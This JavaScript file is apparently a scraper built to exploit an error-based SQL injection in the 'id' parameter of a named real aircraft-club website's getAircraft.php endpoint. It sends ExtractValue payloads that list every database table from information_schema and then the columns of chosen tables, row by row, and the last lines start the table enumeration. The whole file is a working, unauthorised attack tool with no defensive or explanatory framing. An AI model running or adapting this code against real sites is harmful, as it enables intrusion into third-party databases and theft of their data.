if( !String.prototype.supplant ){
    String.prototype.supplant = function(o){
        return this.replace(/{([^{}]*)}/g,function(a,b){
            var r = o[b];
            return typeof r === 'string' ? r:a;
        });
    };
}
if( !Math.rndRange ){
    Math.rndRange = function( min, max ){
        if( isNaN(min) || isNaN(max) ) return NaN;
        return Math.random()*((max-min)+1)+min;
    }
}

var ScrapeAC = (function(){
    var baseURL        = 'https://www.aircraftclubs.com/functions/aircraft/getAircraft.php',
        strInjectParam = 'id',
        errorInject    = " ExtractValue(null,concat(0x3a,({query} limit {start},1))) = 1 ",
        oInjectQry     = {
            allTables:"SELECT table_name FROM information_schema.tables",                                    // List all tables
            allCols  :"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}'" // List all columns
        },//CONCAT(`SUBJECT`, ' ', `YEAR`)
        tables         = [],
        nQueryInterval = 2000,
        nMaxQuerys     = 200;
    
    function _run( strQ, nCurIndex, nStopAt, aResults, callback ){
        var me = this;

        _query.call( this, strQ, nCurIndex++, aResults );
        setTimeout( function(){
            if( nCurIndex < nStopAt || aResults[aResults.length-1] != aResults[aResults.length-3] ){
                _run.call( me, strQ, nCurIndex, nStopAt, aResults );
            }else{
                callback.call(me,aResults);
            }
        },nQueryInterval)
    };

    function _query( strInject, pos, aResults ){
        var str = strInject.supplant({start:pos+''});

        $.ajax({
            url:baseURL,
            method:'POST',
            context:this,
            data:{
                id:str,
                a:'v'
            },
            success:function( data, textStatus, jqXHR ){
                aResults.push(data);
                this.queryComplete(data);
            },
            error:function( jqXHR, textStatus, errorThrown ){
                debugger;
            }
        });
    }

    function ScrapeAC(){
        this.initialize.apply(this,arguments);
    }

    ScrapeAC.prototype = {
        initialize:function(){
            this.aQueryingFinishedListeners = [];
            this.aQueryComplete             = [];
        },

        register:function( oListener ){
            if( oListener ){
                if( oListener.onQueryingFinished ){
                    this.aQueryingFinishedListeners.push(oListener);
                }
                if( oListener.onQueryComplete ){
                    this.aQueryComplete.push(oListener);
                }
            }
        },

        queryFinished:function( aResult ){
            for( var i=0,a=this.aQueryingFinishedListeners,l=a.length; i<l; i++ ){
                a[i].onQueryingFinished(aResults);
            }
        },
        queryComplete:function( sResponse ){
            for( var i=0,a=this.aQueryComplete,l=a.length; i<l; i++ ){
                a[i].onQueryComplete(sResponse);
            }
        },
        
        _processResults:function(){},

        run:function( query ){
            _run.call( this, query, 0, nMaxQuerys, [], this._processResults );
        }    
    };

    ScrapeAC.Listener = function(){};
    ScrapeAC.Listener.prototype = {
        onQueryingFinished:function(){},
        onQueryComplete:function(){}
    };
    
    function ScrapeAllTables(){};
    ScrapeAllTables.prototype = new ScrapeAC();
    ScrapeAllTables.prototype._processResults = function( a ){
        var tables = [],
            reg    = /'(.+)'/;

        if( a && a.map ){
            tables = a.map( function(s){
                var data  = reg.exec(s),
                    table = '';
                if( data && data.length ){
                    table = data[1].substring(1);
                    return table;
                }
                return undefined;
            });
        }
        this.queryFinished(table);
    };
    ScrapeAllTables.prototype.listAllTables = function(){
        var query = errorInject.supplant({query:oInjectQry.allTables});
        this.run(query);
    };


    function ScrapeAllColumns(){};
    ScrapeAllColumns.prototype = new ScrapeAC();
    ScrapeAllColumns.prototype.listAllColumns = function( sTableName ){
        var query = errorInject.supplant({query:oInjectQry.allCols.supplant({table_name:sTableName})});
        this.run(query);
    };

    return {
        ScrapeAllColumns:ScrapeAllColumns,
        ScrapeAllTables:ScrapeAllTables
    };
})();

var a = new ScrapeAC.ScrapeAllTables();
a.listAllTables();
